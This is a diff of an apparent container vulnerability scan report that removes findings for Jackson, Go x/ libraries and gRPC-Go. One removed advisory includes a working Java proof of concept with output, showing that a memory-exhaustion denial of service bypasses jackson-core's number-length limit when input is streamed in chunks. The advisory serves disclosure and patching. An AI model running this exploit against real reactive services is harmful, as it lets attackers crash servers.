@@ -5,424 +5,6 @@
   Class: lang-pkgs
   Type: jar
   Packages: []
-  Vulnerabilities:
-  - VulnerabilityID: GHSA-r7wm-3cxj-wff9
-    PkgName: com.fasterxml.jackson.core:jackson-core
-    PkgPath: openaf/openaf.jar
-    PkgIdentifier:
-      PURL: pkg:maven/com.fasterxml.jackson.core/jackson-core@2.22.0
-      UID: 348817934bcfb1b0
-    InstalledVersion: 2.22.0
-    FixedVersion: 2.18.8, 2.21.4, 2.22.1
-    Status: fixed
-    Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
-    SeveritySource: ghsa
-    PrimaryURL: https://github.com/advisories/GHSA-r7wm-3cxj-wff9
-    DataSource:
-      ID: ghsa
-      Name: GitHub Security Advisory Maven
-      URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven
-    Fingerprint: sha256:e768faefb24fe6e27b930e6108a0afcee46bbce9f430b84d3f7fa113a43b82e9
-    Title: 'jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)'
-    Description: |-
-      ## Summary
-
-      The fix released in jackson-core `2.18.6` and `2.21.1` for [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-core/security/advisories/GHSA-72hv-8253-57qq) (Number Length Constraint Bypass in Async Parser, published 2026-02-28) is incomplete. The fix commit `b0c428e6` (#1555) wired `validateIntegerLength` into a new `_setIntLength` helper and called it at every place where the integer portion of a number is *decided* (terminator byte arrived, `.` / `e/E` seen, end-of-feed inside a fully-buffered value). It did not call it on the much more attacker-relevant path: "ran out of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`, return `NOT_AVAILABLE` to caller".
-
-      As a result, an attacker who streams JSON to a non-blocking parser in many small chunks, without ever sending a terminator byte, can keep the parser inside `MINOR_NUMBER_INTEGER_DIGITS` indefinitely. `_textBuffer.expandCurrentSegment()` grows on every chunk, and `validateIntegerLength` is never invoked. The accumulator is only gated by `maxStringLength` (20 MiB default) — a **~20,000x amplification** of the documented `maxNumberLength` (1000 default).
-
-      This is the same vulnerability class, same advisory wording ("Memory Exhaustion: Unbounded allocation in TextBuffer from excessively long numbers"), same parser class — just the streaming path the original fix didn't cover. The fix to the *fraction* path is correct (see `_finishFloatFraction` at line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where `_setFractLength(fractLen)` IS called before the `NOT_AVAILABLE` return); the equivalent call is missing from every integer-digit path.
-
-      ## Affected versions
-
-      Verified on the patched releases:
-      - `com.fasterxml.jackson.core:jackson-core` **2.18.6**
-      - `com.fasterxml.jackson.core:jackson-core` **2.21.1**
-
-      Structurally identical code in `tools.jackson.core` 3.0.x / 3.1.x — same `NonBlockingUtf8JsonParserBase` class, same `_setIntLength` rollout, same NOT_AVAILABLE returns without validation. Not retested but presumed vulnerable.
-
-      ## Affected code
-
-      [`src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java`](https://github.com/FasterXML/jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java) in 2.18.6 / 2.21.1.
-
-      ### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:
-
-      ```java
-      if (outPtr >= outBuf.length) {
-          // NOTE: must expand to ensure contents all in a single buffer (to keep
-          // other parts of parsing simpler)
-          outBuf = _textBuffer.expandCurrentSegment();
-      }
-      outBuf[outPtr++] = (char) ch;
-      if (++_inputPtr >= _inputEnd) {
-          _minorState = MINOR_NUMBER_INTEGER_DIGITS;
-          _textBuffer.setCurrentLength(outPtr);
-          return _updateTokenToNA();          // <-- no validateIntegerLength(outPtr)
-      }
-      ```
-
-      ### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:
-
-      ```java
-      protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {
-          int negMod = _numberNegative ? -1 : 0;
-
-          while (true) {
-              if (_inputPtr >= _inputEnd) {
-                  _minorState = MINOR_NUMBER_INTEGER_DIGITS;
-                  _textBuffer.setCurrentLength(outPtr);
-                  return _updateTokenToNA();    // <-- no validateIntegerLength(outPtr + negMod)
-              }
-              int ch = getByteFromBuffer(_inputPtr) & 0xFF;
-              if (ch < INT_0) {
-                  if (ch == INT_PERIOD) {
-                      _setIntLength(outPtr+negMod);   // <-- validated here
-                      ++_inputPtr;
-                      return _startFloat(outBuf, outPtr, ch);
-                  }
-                  break;
-              }
-              if (ch > INT_9) {
-                  if ((ch | 0x20) == INT_e) {
-                      _setIntLength(outPtr+negMod);   // <-- validated here
-                      ++_inputPtr;
-                      return _startFloat(outBuf, outPtr, ch);
-                  }
-                  break;
-              }
-              ++_inputPtr;
-              if (outPtr >= outBuf.length) {
-                  outBuf = _textBuffer.expandCurrentSegment();
-              }
-              outBuf[outPtr++] = (char) ch;
-          }
-          _setIntLength(outPtr+negMod);            // <-- validated here
-          _textBuffer.setCurrentLength(outPtr);
-          return _valueComplete(JsonToken.VALUE_NUMBER_INT);
-      }
-      ```
-
-      The pattern recurs at lines 1297, 1329, 1343, 1365, 1395, 1409, 1437, 1467, 1481, 1586, 1644, 1698 — every "ran out of input mid-integer" exit returns to the caller without validating the accumulator length.
-
-      ### Compare with the fraction path that is correct
-
-      `_finishFloatFraction` lines 1827-1838:
-
-      ```java
-      while (loop) {
-          if (ch >= INT_0 && ch <= INT_9) {
-              ++fractLen;
-              if (outPtr >= outBuf.length) {
-                  outBuf = _textBuffer.expandCurrentSegment();
-              }
-              outBuf[outPtr++] = (char) ch;
-              if (_inputPtr >= _inputEnd) {
-                  _textBuffer.setCurrentLength(outPtr);
-                  _setFractLength(fractLen);          // <-- VALIDATED
-                  return JsonToken.NOT_AVAILABLE;
-              }
-              ch = getNextSignedByteFromBuffer();
-          }
-          ...
-      }
-      ```
-
-      ## Impact
-
-      Reactive frameworks (Spring WebFlux / Reactor, Quarkus, Helidon, Vert.x JSON, anything wrapping `JsonFactory.createNonBlockingByteArrayParser()` or `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC bytes to the async parser as they arrive. Operators who set `StreamReadConstraints.builder().maxNumberLength(N)` on the assumption that this caps memory per number value are not getting that guarantee in chunked-feed scenarios. The parser silently accumulates digits up to `maxStringLength` (20 MiB default) per concurrent connection. Multiply by attacker-controlled concurrency to OOM the JVM.
-
-      The synchronous parsers (`UTF8StreamJsonParser`, `ReaderBasedJsonParser`) and the async parser on *complete* input are not affected — those paths go through `_setIntLength` or `ParserBase._reportTooLongIntegral` correctly.
-
-      CWE-770 (Allocation of Resources Without Limits or Throttling), CVSS roughly the same as the parent advisory (Network / Low complexity / High availability impact). The parent advisory was scored CVSS 8.7 High.
-
-      ## Proof of concept
-
-      Standalone PoC, no Maven required:
-
-      ```
-      mkdir poc && cd poc
-      curl -sLo jackson-core-2.18.6.jar https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.18.6/jackson-core-2.18.6.jar
-      cat > PoC.java <<'EOF'
-      import com.fasterxml.jackson.core.*;
-      import com.fasterxml.jackson.core.async.ByteArrayFeeder;
-
-      public class PoC {
-          public static void main(String[] args) throws Exception {
-              StreamReadConstraints strict = StreamReadConstraints.builder()
-                      .maxNumberLength(1000)
-                      .build();
-              JsonFactory f = new JsonFactoryBuilder()
-                      .streamReadConstraints(strict)
-                      .build();
-
-              // Sanity: synchronous parser rejects 5000-digit int.
-              try (JsonParser p = f.createParser("{\"v\":" + "1".repeat(5000) + "}")) {
-                  while (p.nextToken() != null) { /* drive */ }
-                  System.out.println("[-] BUG ABSENT: sync parser accepted");
-                  return;
-              } catch (Exception e) {
-                  System.out.println("[+] sync parser rejected 5000-digit int: " + e.getClass().getSimpleName());
-              }
-
-              // Bug: async parser, chunked, no terminator.
-              JsonParser ap = f.createNonBlockingByteArrayParser();
-              ByteArrayFeeder feeder = (ByteArrayFeeder) ap;
-
-              byte[] preamble = "{\"v\":".getBytes("UTF-8");
-              feeder.feedInput(preamble, 0, preamble.length);
-              while (ap.nextToken() != JsonToken.NOT_AVAILABLE) { /* drain */ }
-
-              byte[] digits = new byte[16 * 1024];
-              for (int i = 0; i < digits.length; i++) digits[i] = (byte) ('1' + (i % 9));
-
-              for (int c = 0; c < 600; c++) {
-                  feeder.feedInput(digits, 0, digits.length);
-                  JsonToken t = ap.nextToken();
-                  if (t != JsonToken.NOT_AVAILABLE) {
-                      System.out.println("[-] unexpected token: " + t);
-                      return;
-                  }
-              }
-              System.out.println("[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000");
-
-              // Closing the number now finally triggers the validator.
-              feeder.feedInput("}".getBytes("UTF-8"), 0, 1);
-              feeder.endOfInput();
-              try {
-                  while (ap.nextToken() != null) { /* drive */ }
-              } catch (Exception e) {
-                  System.out.println("[*] late rejection on close: " + e.getMessage().split("\n")[0]);
-              }
-              ap.close();
-          }
-      }
-      EOF
-      javac -cp jackson-core-2.18.6.jar PoC.java
-      java -Xmx256m -cp jackson-core-2.18.6.jar:. PoC
-      ```
-
-      Observed output against `jackson-core-2.18.6`:
-
-      ```
-      [+] sync parser rejected 5000-digit int: StreamConstraintsException
-      [+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000
-      [*] late rejection on close: Number value length (9830400) exceeds the maximum allowed (1000, from `StreamReadConstraints.getMaxNumberLength()`)
-      ```
-
-      Observed output against `jackson-core-2.21.1`: identical.
-
-      The 9.83 MB figure is purely a function of the loop bound (600 chunks * 16 KiB). The actual ceiling is `maxStringLength = 20 MiB`. With the strict policy declared as `maxNumberLength = 1000`, the parser permits **9830x** more allocation than the policy allows. With `maxStringLength` left at the default 20 MiB, an attacker can drive a single connection to 40 MiB of `char[]` heap (chars are 2 bytes each) before the validator finally fires on terminator/`endOfInput()`. Multiply by concurrent connections.
-
-      ## End-to-end reproduction through real HTTP
-
-      Supplements the standalone PoC with a running Spring Boot WebFlux server,
-      driving the same bug through the actual reactor-netty + Jackson2JsonDecoder
-      streaming-decode path that production reactive endpoints use.
-
-      Setup:
-      - Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14, reactor-netty 1.1.23)
-      - jackson-databind 2.17.2, jackson-core overridden:
-        - VULN run: `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest published)
-        - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch
-      - JVM: OpenJDK 17.0.18
-      - Server `JsonFactory` configured with `StreamReadConstraints.builder().maxNumberLength(1000).build()`
-
-      Endpoint under test exposes the `Flux<DataBuffer>` request body directly to
-      `Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so the parser sees one
-      HTTP chunk per `feedInput` (the same pattern used for any
-      `@RequestBody Flux<...>` / streaming JSON decoder in WebFlux). A raw-socket
-      HTTP/1.1 chunked client streams `{"v":1` then 250 chunks of 200 digit bytes
-      each (50,000 digits total) at 20ms intervals, then writes the closing `}`.
-
-      VULN — jackson-core 2.18.7:
-      ```
-      [VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks; server still accepting
-      [VULN-SMALLCHUNK] full POST sent (50000 digits). Response:
-      HTTP/1.1 200 OK
-      ERR after 6548ms cause=com.fasterxml.jackson.core.exc.StreamConstraintsException:
-             Number value length (50000) exceeds the maximum allowed (1000, ...)
-      ```
-      Server-side controller trace (250 DataBuffer arrivals elided):
-      ```
-      [ctrl] DataBuffer arrived size=6   ms=39       <- '{"v":1'
-      [ctrl] DataBuffer arrived size=200 ms=42
-      ...
-      [ctrl] DataBuffer arrived size=199 ms=5993
-      [ctrl] DataBuffer arrived size=1   ms=6518     <- closing '}'
-      [ctrl] ERR after 6548ms ... Number value length (50000) exceeds ...
-      ```
-      Server held all 50,000 digit characters in `_textBuffer` for 6.5 seconds with
-      `maxNumberLength=1000` declared. The validator never fires during streaming;
-      it only fires at value-completion when the closing `}` arrives.
-
-      PATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):
-      ```
-      [PATCHED-SMALLCHUNK] connection broke after 2801 digits at chunk 14: [Errno 32] Broken pipe
-      [PATCHED-SMALLCHUNK] DONE: digits_sent=2801 status=connection-broke-mid-stream
-      ```
-      Server-side controller trace:
-      ```
-      [ctrl] DataBuffer arrived size=6   ms=129
-      [ctrl] DataBuffer arrived size=200 ms=142
-      [ctrl] DataBuffer arrived size=200 ms=142
-      [ctrl] DataBuffer arrived size=200 ms=145
-      [ctrl] DataBuffer arrived size=200 ms=146
-      [ctrl] DataBuffer arrived size=200 ms=147
-      [ctrl] ERR after 155ms ... Number value length (1001) exceeds the maximum allowed (1000, ...)
-      ```
-      Patched server raises `StreamConstraintsException` at 155ms after only 5
-      DataBuffers, exactly when the accumulated digit count crosses
-      `maxNumberLength=1000`. The connection is reset mid-stream rather than the
-      parser silently consuming the rest of the attacker's payload.
-
-      Side-by-side:
-
-      | Build | Chunks accepted before exception | Digits buffered | Time to detection |
-      |---|---|---|---|
-      | jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the configured limit) | 6,548ms — only at terminator |
-      | 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment threshold crossed |
-
-      Note on the default `@RequestBody Mono<JsonNode>` path: that path cannot
-      distinguish the two builds because Spring's `decodeToMono` joins all
-      DataBuffers into one before parsing. The exploitable shape is the
-      streaming-decode path (`Flux<JsonNode>` / `@RequestBody Flux<...>` /
-      WebSocket / SSE / any direct `decoder.decode(Flux<DataBuffer>, ...)` call),
-      which is also what `Jackson2Tokenizer` uses for any streaming JSON
-      deserialization in WebFlux and Quarkus reactive REST.
-
-      ## Suggested fix
-
-      Mirror the pattern already used in `_finishFloatFraction`. At every site that returns `_updateTokenToNA()` (or `JsonToken.NOT_AVAILABLE`) with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr + negMod)` first. Concretely, the diff to `NonBlockingUtf8JsonParserBase.java` would be:
-
-      ```diff
-           protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {
-               int negMod = _numberNegative ? -1 : 0;
-
-               while (true) {
-                   if (_inputPtr >= _inputEnd) {
-                       _minorState = MINOR_NUMBER_INTEGER_DIGITS;
-                       _textBuffer.setCurrentLength(outPtr);
-      +                _streamReadConstraints.validateIntegerLength(outPtr + negMod);
-                       return _updateTokenToNA();
-                   }
-      ```
-
-      Note: `_setIntLength` itself can't be used as-is because it also assigns `_intLength`, and `_intLength` must not be set until the integer is truly complete (subsequent fraction handling reads `_intLength`). The minimal fix is to call only the validator, as shown.
-
-      Apply the same one-line insertion before each `return _updateTokenToNA();` that exits with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12 lines total).
-
-      Alternatively, a heavier refactor: also gate `_textBuffer.expandCurrentSegment()` calls inside the digit-accumulation loops on `outPtr < maxNumberLength` so that the validator fires at the moment the buffer would be enlarged past the limit, rather than waiting for the next chunk boundary. Either approach is sufficient.
-
-      ## Credit
-
-      Reported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq.
-    Severity: HIGH
-    VendorSeverity:
-      ghsa: 3
-    CVSS:
-      ghsa:
-        V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N
-        V40Score: 8.7
-    References:
-    - https://github.com/FasterXML/jackson-core
-    - https://github.com/FasterXML/jackson-core/commit/050b429804dce2a7e08f0be1b0b4c3d040fdb9cd
-    - https://github.com/FasterXML/jackson-core/commit/4cdd529749da396cc7edf6d4a2aad41d47902641
-    - https://github.com/FasterXML/jackson-core/commit/c5941e5aae7fd5aeac55d66933cfb82b9aabeef8
-    - https://github.com/FasterXML/jackson-core/pull/1611
-    - https://github.com/FasterXML/jackson-core/security/advisories/GHSA-r7wm-3cxj-wff9
-    PublishedDate: '2026-07-21T21:58:53Z'
-    LastModifiedDate: '2026-07-21T21:58:53Z'
-  - VulnerabilityID: CVE-2026-54515
-    VendorIDs:
-    - GHSA-5jmj-h7xm-6q6v
-    PkgName: com.fasterxml.jackson.core:jackson-databind
-    PkgPath: openaf/openaf.jar
-    PkgIdentifier:
-      PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.22.0
-      UID: c3b2e55f064f8b6
-    InstalledVersion: 2.22.0
-    FixedVersion: 3.1.4, 2.18.9, 2.21.5, 2.22.1
-    Status: fixed
-    Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
-    SeveritySource: ghsa
-    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-54515
-    DataSource:
-      ID: ghsa
-      Name: GitHub Security Advisory Maven
-      URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven
-    Fingerprint: sha256:2dcfee7ef77e23b9c986f15c39b6e7ca69335ca0ed8a85f056838e9a970e39d2
-    Title: 'jackson-databind: jackson-databind: Ignored properties can be unexpectedly modified'
-    Description: jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.8.0 until 2.18.9, 2.21.5, and 3.1.4, in BeanDeserializerBase.createContextual(), per-property @JsonIgnoreProperties exclusions are applied by _handleByNameInclusion(), producing a contextual deserializer whose BeanPropertyMap has the ignored properties removed. The subsequent per-property case-insensitivity block (triggered by @JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)) rebuilds from this._beanProperties (the original, unfiltered map) instead of contextual._beanProperties, then overwrites the filtered map — restoring every property _handleByNameInclusion had just removed. The ignored property becomes writable again. This vulnerability is fixed in 2.18.9, 2.21.5, and 3.1.4.
-    Severity: MEDIUM
-    CweIDs:
-    - CWE-915
-    VendorSeverity:
-      amazon: 3
-      ghsa: 2
-      redhat: 2
-    CVSS:
-      ghsa:
-        V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
-        V3Score: 5.3
-      redhat:
-        V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
-        V3Score: 5.3
-    References:
-    - https://access.redhat.com/security/cve/CVE-2026-54515
-    - https://github.com/FasterXML/jackson-databind
-    - https://github.com/FasterXML/jackson-databind/commit/0e1b0b211f7a53baa62ba2f4c9bd006c7bf4d5fa
-    - https://github.com/FasterXML/jackson-databind/issues/5962
-    - https://github.com/FasterXML/jackson-databind/issues/5964
-    - https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-5jmj-h7xm-6q6v
-    - https://nvd.nist.gov/vuln/detail/CVE-2026-54515
-    - https://www.cve.org/CVERecord?id=CVE-2026-54515
-    PublishedDate: '2026-06-23T21:17:02.597Z'
-    LastModifiedDate: '2026-06-29T13:38:59.057Z'
-  - VulnerabilityID: CVE-2026-59889
-    VendorIDs:
-    - GHSA-5gvw-p9qm-jgwh
-    PkgName: com.fasterxml.jackson.core:jackson-databind
-    PkgPath: openaf/openaf.jar
-    PkgIdentifier:
-      PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.22.0
-      UID: c3b2e55f064f8b6
-    InstalledVersion: 2.22.0
-    FixedVersion: 2.21.5, 2.18.9, 2.22.1
-    Status: fixed
-    Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
-    SeveritySource: ghsa
-    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-59889
-    DataSource:
-      ID: ghsa
-      Name: GitHub Security Advisory Maven
-      URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven
-    Fingerprint: sha256:a101d4ab343eb51e70950c19d0ce1049aacd4f8f8c61cb3586f5852bfa06cec0
-    Title: 'jackson-databind: @JsonView ypassed for @JsonUnwrapped container properties on deserialization'
-    Description: jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.18.0 until 2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1, UnwrappedPropertyHandler.processUnwrapped() replays buffered JSON for a @JsonUnwrapped property and calls prop.deserializeAndSet() without a prop.visibleInView(ctxt.getActiveView()) guard, allowing a property annotated with both @JsonView and @JsonUnwrapped to be written from attacker JSON under a less-privileged active view. This issue is fixed in versions 2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1.
-    Severity: MEDIUM
-    CweIDs:
-    - CWE-863
-    VendorSeverity:
-      ghsa: 2
-    CVSS:
-      ghsa:
-        V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
-        V3Score: 6.5
-    References:
-    - https://github.com/FasterXML/jackson-databind
-    - https://github.com/FasterXML/jackson-databind/commit/d627a8a86fcb062429282f79f3f256f181ed2c7b
-    - https://github.com/FasterXML/jackson-databind/issues/6060
-    - https://github.com/FasterXML/jackson-databind/pull/6056
-    - https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-5gvw-p9qm-jgwh
-    - https://nvd.nist.gov/vuln/detail/CVE-2026-59889
-    PublishedDate: '2026-07-14T21:17:06.16Z'
-    LastModifiedDate: '2026-07-16T16:19:15.79Z'
 - Target: Node.js
   Class: lang-pkgs
   Type: node-pkg
@@ -437,21 +19,21 @@
   Packages: []
   Vulnerabilities:
   - VulnerabilityID: GO-2026-5932
-    PkgID: golang.org/x/crypto@v0.52.0
+    PkgID: golang.org/x/crypto@v0.53.0
     PkgName: golang.org/x/crypto
     PkgIdentifier:
-      PURL: pkg:golang/golang.org/x/crypto@v0.52.0
-      UID: 2b26bad30f661468
-    InstalledVersion: v0.52.0
+      PURL: pkg:golang/golang.org/x/crypto@v0.53.0
+      UID: 28dd7c39c48a1330
+    InstalledVersion: v0.53.0
     Status: affected
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:ddd0197dc729d461f195ff3951124f70b05f0c20848d4516030e99973dc22d91
+    Fingerprint: sha256:244a572b1aeebd83716b4782378e67fbc43c4bc59cef133f1ca5d4243e981ea8
     Title: The golang.org/x/crypto/openpgp package is unmaintained, unsafe by design, and has known security issues
     Description: |-
       The golang.org/x/crypto/openpgp package is unsafe by design, has numerous known security issues, is not maintained, and should not be used.
@@ -461,181 +43,27 @@
     References:
     - https://go.dev/issue/44226
     - https://pkg.go.dev/vuln/GO-2026-5932
-  - VulnerabilityID: CVE-2026-46600
-    VendorIDs:
-    - GO-2026-5942
-    PkgID: golang.org/x/net@v0.55.0
-    PkgName: golang.org/x/net
-    PkgIdentifier:
-      PURL: pkg:golang/golang.org/x/net@v0.55.0
-      UID: f924e5a57022ddfb
-    InstalledVersion: v0.55.0
-    FixedVersion: 0.56.0
-    Status: fixed
-    Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
-    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-46600
-    DataSource:
-      ID: govulndb
-      Name: The Go Vulnerability Database
-      URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:6cc129c68227e7c4e5a68a5566ec8e187e4d725a0f40f1906d960d309aee43b3
-    Title: Parsing an invalid SVCB or HTTPS RR can panic when the size of a param ...
-    Description: Parsing an invalid SVCB or HTTPS RR can panic when the size of a parameter value overflows the message buffer.
-    Severity: UNKNOWN
-    CweIDs:
-    - CWE-125
-    References:
-    - https://go.dev/cl/786345
-    - https://go.dev/issue/79795
-    - https://pkg.go.dev/vuln/GO-2026-5942
-    PublishedDate: '2026-07-21T20:17:01.213Z'
-    LastModifiedDate: '2026-07-23T18:27:48.877Z'
-  - VulnerabilityID: CVE-2026-56852
-    VendorIDs:
-    - GO-2026-5970
-    PkgID: golang.org/x/text@v0.38.0
-    PkgName: golang.org/x/text
-    PkgIdentifier:
-      PURL: pkg:golang/golang.org/x/text@v0.38.0
-      UID: cc7844dfa03c0f59
-    InstalledVersion: v0.38.0
-    FixedVersion: 0.39.0
-    Status: fixed
-    Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
-    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-56852
-    DataSource:
-      ID: govulndb
-      Name: The Go Vulnerability Database
-      URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:bb529d3e0f7636f41453aa9e1e62f87d3f78b92967e09325851410ba8b56e4fc
-    Title: A norm.Iter can enter an infinite loop when handling input containing  ...
-    Description: A norm.Iter can enter an infinite loop when handling input containing invalid UTF-8 bytes.
-    Severity: HIGH
-    CweIDs:
-    - CWE-835
-    VendorSeverity:
-      azure: 3
-    References:
-    - https://go.dev/cl/794100
-    - https://go.dev/issue/80142
-    - https://nvd.nist.gov/vuln/detail/CVE-2026-56852
-    - https://pkg.go.dev/vuln/GO-2026-5970
-    PublishedDate: '2026-07-21T20:17:02.867Z'
-    LastModifiedDate: '2026-07-23T18:27:48.877Z'
-  - VulnerabilityID: GHSA-hrxh-6v49-42gf
-    PkgID: google.golang.org/grpc@v1.81.1
-    PkgName: google.golang.org/grpc
-    PkgIdentifier:
-      PURL: pkg:golang/google.golang.org/grpc@v1.81.1
-      UID: '6352336039511707'
-    InstalledVersion: v1.81.1
-    FixedVersion: 1.82.1
-    Status: fixed
-    Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
-    SeveritySource: ghsa
-    PrimaryURL: https://github.com/advisories/GHSA-hrxh-6v49-42gf
-    DataSource:
-      ID: ghsa
-      Name: GitHub Security Advisory Go
-      URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago
-    Fingerprint: sha256:93bcc09e5c30d86101ba9a67bacf3149bc0b75eea0df1e03bbed567a841ef49d
-    Title: 'gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities'
-    Description: |-
-      Multiple security vulnerabilities have been identified and addressed in grpc-go affecting the xDS RBAC authorization engine (internal/xds/rbac) and the HTTP/2 transport server implementation (internal/transport). These vulnerabilities could result in:
-
-      - Authorization Bypass (Fail-Open) when translating xDS RBAC policies containing `Metadata` or `RequestedServerName` fields.
-      - Denial of Service (High CPU Consumption) due to an HTTP/2 Rapid Reset mitigation bypass during client-initiated stream resets.
-      - Denial of Service (Server Panic) when parsing crafted xDS RBAC policies containing `NOT` rules around unsupported fields.
-
-
-      ### Impact
-      _What kind of vulnerability is it? Who is impacted?_
-
-      #### xDS RBAC Authorization Bypass via `Metadata` & `RequestedServerName` matchers
-
-      - Affected Component: xDS RBAC 
-      - Impact: When building policy matchers for gRPC RBAC from xDS configurations, unsupported `permission` and `principal` rules (specifically `Metadata` and `RequestedServerName`) were silently ignored and treated as no-ops.
-        - If an authorization policy relied purely on these matchers for access control, treating those rules as no-ops effectively removed the restrictions.
-      - If these unsupported rules were nested inside logical `NOT` rules (`Permission_NotRule` / `Principal_NotId`) or multi-condition `OR/AND` rules, silently dropping them changed the boolean logic flow of the authorization engine.
-
-      As a result, policy evaluation decisions could fail open, allowing unauthorized clients to access protected gRPC services or resources.
-
-      #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of Service via Stream Aborts
-
-      - Affected Component: HTTP/2 transport
-      - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid Reset only applied threshold checks to items that directly resulted in control frames being written back to the wire, such as `SETTINGS` ACKs or server-initiated `RST_STREAM`s.
-
-      When a client initiated a rapid flood of stream creation (`HEADERS`) immediately followed by stream termination `RST_STREAM`, items queued up in the control buffer without counting against the transport response frame threshold. An attacker can repeatedly trigger this flood sequence to bypass reader blocking, resulting in high CPU usage, and Denial of Service (DoS).
-
-      #### Denial of Service (Panic) in xDS RBAC Engine via Unsupported Fields inside NOT Rules
-
-      - Affected Component: xDS RBAC 
-      - Impact: The xDS RBAC policy translators recursively generate matchers for nested rules. When a `NOT` rule wrapped an unsupported or unhandled field (such as `SourcedMetadata`), the recursive step returned an empty matcher. This could result in a runtime panic when the RBAC engine attempts to authorize an incoming request.
-
-      An attacker or misconfigured/malicious xDS management server delivering an LDS/RDS update containing a `NOT` rule around an unhandled field causes the gRPC server process to crash immediately (CWE-248 / Denial of Service).
-
-      ### Patches
-      _Has the problem been patched? What versions should users upgrade to?_
-
-      All three issues have been fixed in `master` and will be released in 1.82.1 shortly.
-
-      ### Workarounds
-      _Is there a way for users to fix or remediate the vulnerability without upgrading?_
-
-      If upgrading grpc-go immediately is not possible, apply the following workarounds based on your deployment architecture:
-
-      * For xDS RBAC Vulnerabilities & Panics: Ensure that upstream xDS management servers do not push RBAC policies containing `Metadata`, `RequestedServerName`, or `NOT` rules wrapping unsupported fields (such as `SourcedMetadata`) to grpc-go servers.
